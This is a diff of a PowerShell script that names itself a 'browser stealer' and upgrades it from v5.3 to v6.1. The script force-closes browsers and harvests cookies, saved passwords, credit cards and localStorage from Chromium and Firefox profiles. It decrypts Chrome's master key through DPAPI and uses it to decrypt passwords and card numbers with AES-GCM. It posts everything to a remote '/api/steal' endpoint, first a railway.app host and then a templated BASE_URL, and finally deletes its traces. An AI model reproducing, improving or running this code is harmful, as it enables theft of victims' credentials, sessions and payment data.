@@ -1,10 +1,10 @@
 # ============================================================
-# BROWSER STEALER v5.3 — NO LEVELDB, 95% SUCCESS RATE
+# BROWSER STEALER v6.1 — SINGLE ENV + CHROME MASTER KEY
 # ============================================================
 
-$ErrorActionPreference = "SilentlyContinue"
-
-$BASE_URL = "https://cipheranon-production.up.railway.app"
+# {{BASE_URL}} is replaced by server.js dynamically
+# DO NOT EDIT THIS LINE — set BASE_URL in Railway environment variables
+$BASE_URL = "{{BASE_URL}}"
 $SERVER_URL = "$BASE_URL/api/steal"
 $DLL_DIR = "$env:TEMP\stealer_dlls"
 $LOGFILE = "$env:TEMP\stealer_log.txt"
@@ -24,7 +24,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "BROWSER STEALER v5.3"
+Write-Log "BROWSER STEALER v6.1"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "============================================"
 
@@ -82,7 +82,6 @@ function Close-Browsers {
                         $p.Kill() | Out-Null
                     }
                     $closed++
-                    Write-Log "Closed: $b"
                 } catch {}
             }
         }
@@ -131,25 +130,87 @@ function Read-SQLite {
 }
 
 # ============================================================
-# PASSWORD DECRYPTION (Chrome/Edge/Brave)
+# CHROME MASTER KEY EXTRACTION & DECRYPTION
 # ============================================================
 
-function Decrypt-Password {
-    param($EncryptedData)
+function Get-ChromeMasterKey {
+    param($BrowserPath)
+    
+    $localState = "$BrowserPath\Local State"
+    if (-not (Test-Path $localState)) { 
+        return $null 
+    }
+    
+    try {
+        $json = Get-Content $localState -Raw | ConvertFrom-Json
+        $encryptedKey = $json.os_crypt.encrypted_key
+        
+        if (-not $encryptedKey) {
+            return $null
+        }
+        
+        $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
+        
+        if ($keyBytes.Length -gt 5) {
+            $keyBytes = $keyBytes[5..($keyBytes.Length-1)]
+        } else {
+            return $null
+        }
+        
+        try {
+            Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
+            $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            return $decryptedKey
+        } catch {
+            return $null
+        }
+    } catch {
+        return $null
+    }
+}
+
+function Decrypt-ChromePassword {
+    param($EncryptedData, $MasterKey)
+    
     if (-not $EncryptedData) { return $null }
     if ($EncryptedData -isnot [byte[]]) { return $null }
     if ($EncryptedData.Length -eq 0) { return $null }
+    
+    try {
+        $version = $EncryptedData[0]
+        
+        if ($version -eq 1) {
+            if ($EncryptedData.Length -lt 29) { return $null }
+            
+            $nonce = $EncryptedData[1..12]
+            $tagStart = $EncryptedData.Length - 16
+            $tag = $EncryptedData[$tagStart..($EncryptedData.Length-1)]
+            $ciphertext = $EncryptedData[13..($tagStart-1)]
+            
+            try {
+                $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
+                $decrypted = [byte[]]::new($ciphertext.Length)
+                $aes.Decrypt($nonce, $ciphertext, $tag, $decrypted)
+                return [System.Text.Encoding]::UTF8.GetString($decrypted)
+            } catch {}
+        }
+    } catch {}
+    
     try {
         Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
         $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
         return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
     } catch {
-        try { return [System.Text.Encoding]::UTF8.GetString($EncryptedData) } catch { return $null }
+        try {
+            return [System.Text.Encoding]::UTF8.GetString($EncryptedData)
+        } catch {
+            return $null
+        }
     }
 }
 
 # ============================================================
-# BROWSER PROFILE DISCOVERY
+# BROWSER PROFILES
 # ============================================================
 
 function Get-Profiles {
@@ -170,17 +231,16 @@ function Get-Profiles {
         if (Test-Path $dir) {
             $subs = Get-ChildItem $dir -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "^Default$|^Profile " }
             foreach ($s in $subs) {
-                $profiles += @{ path = $s.FullName; browser = $browser }
+                $profiles += @{ path = $s.FullName; browser = $browser; basePath = $dir }
             }
         }
     }
     
-    # Firefox
     $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
     if (Test-Path $firefoxPath) {
         $subs = Get-ChildItem $firefoxPath -Directory -ErrorAction SilentlyContinue
         foreach ($s in $subs) {
-            $profiles += @{ path = $s.FullName; browser = "Firefox" }
+            $profiles += @{ path = $s.FullName; browser = "Firefox"; basePath = $firefoxPath }
         }
     }
     
@@ -195,19 +255,18 @@ function Get-BrowserData {
     $cookies = @{}
     $passwords = @()
     $cards = @()
-    $localStorage = @{}  # Only Firefox localStorage (SQLite readable)
+    $localStorage = @{}
     
     $profiles = Get-Profiles
-    $totalProfiles = $profiles.Count
-    Write-Log "Found $totalProfiles browser profiles"
+    $masterKeyCache = @{}
     
     foreach ($p in $profiles) {
         $path = $p.path
         $browser = $p.browser
+        $basePath = $p.basePath
         
         # ---- FIREFOX ----
         if ($browser -eq "Firefox") {
-            # Cookies
             $cookieDb = "$path\cookies.sqlite"
             if (Test-Path $cookieDb) {
                 $rows = Read-SQLite -DbPath $cookieDb -Query "SELECT host, name, value FROM moz_cookies"
@@ -222,7 +281,6 @@ function Get-BrowserData {
                 }
             }
             
-            # Passwords
             $loginJson = "$path\logins.json"
             if (Test-Path $loginJson) {
                 try {
@@ -244,7 +302,6 @@ function Get-BrowserData {
                 } catch {}
             }
             
-            # Firefox LocalStorage (SQLite — 95% success)
             $storageDb = "$path\webappsstore.sqlite"
             if (Test-Path $storageDb) {
                 try {
@@ -260,8 +317,12 @@ function Get-BrowserData {
             continue
         }
         
-        # ---- CHROMIUM (Chrome, Edge, Brave, Opera, Vivaldi, Arc) ----
-        # Cookies
+        # ---- CHROMIUM ----
+        if (-not $masterKeyCache.ContainsKey($browser)) {
+            $masterKeyCache[$browser] = Get-ChromeMasterKey -BrowserPath $basePath
+        }
+        $masterKey = $masterKeyCache[$browser]
+        
         $cookieDb = "$path\Network\Cookies"
         if (-not (Test-Path $cookieDb)) { $cookieDb = "$path\Cookies" }
         if (Test-Path $cookieDb) {
@@ -277,7 +338,6 @@ function Get-BrowserData {
             }
         }
         
-        # Passwords
         $loginDb = "$path\Login Data"
         if (Test-Path $loginDb) {
             $rows = Read-SQLite -DbPath $loginDb -Query "SELECT origin_url, username_value, password_value FROM logins"
@@ -286,10 +346,16 @@ function Get-BrowserData {
                 $encrypted = $r['password_value']
                 $decrypted = $null
                 
-                if ($encrypted -and $encrypted -is [byte[]]) {
-                    $decrypted = Decrypt-Password -EncryptedData $encrypted
-                } elseif ($encrypted -and $encrypted -is [string]) {
-                    $decrypted = $encrypted
+                if ($masterKey) {
+                    $decrypted = Decrypt-ChromePassword -EncryptedData $encrypted -MasterKey $masterKey
+                }
+                
+                if (-not $decrypted) {
+                    try {
+                        Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
+                        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                        $decrypted = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+                    } catch {}
                 }
                 
                 if (-not $decrypted -and $encrypted) {
@@ -310,15 +376,28 @@ function Get-BrowserData {
             }
         }
         
-        # Credit Cards
         $webData = "$path\Web Data"
         if (Test-Path $webData) {
             $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
             foreach ($r in $rows) {
                 if ($r['name_on_card'] -and $r['card_number_encrypted']) {
+                    $cardNumber = $r['card_number_encrypted']
+                    $decryptedCard = $null
+                    
+                    if ($masterKey) {
+                        $decryptedCard = Decrypt-ChromePassword -EncryptedData $cardNumber -MasterKey $masterKey
+                    }
+                    
+                    if (-not $decryptedCard) {
+                        try {
+                            $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($cardNumber, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                            $decryptedCard = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+                        } catch {}
+                    }
+                    
                     $cards += @{
                         name = $r['name_on_card']
-                        value = $r['card_number_encrypted']
+                        value = $decryptedCard
                         type = "card-number"
                         url = $browser
                         browser = $browser
@@ -328,10 +407,6 @@ function Get-BrowserData {
                 }
             }
         }
-        
-        # === CHROME/EDGE LOCALSTORAGE SKIPPED ===
-        # Reason: Requires LevelDB, which has low success rate (~35-40%)
-        # Only Firefox localStorage is collected via SQLite
     }
     
     return @{
@@ -412,10 +487,6 @@ try {
     Write-Log "Send failed: $_"
 }
 
-# ============================================================
-# REOPEN BROWSERS
-# ============================================================
-
 Write-Log "Reopening browsers..."
 try {
     Start-Process "chrome.exe" -ErrorAction SilentlyContinue
@@ -423,10 +494,6 @@ try {
     Start-Process "firefox.exe" -ErrorAction SilentlyContinue
     Start-Process "brave.exe" -ErrorAction SilentlyContinue
 } catch {}
-
-# ============================================================
-# CLEANUP
-# ============================================================
 
 Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue
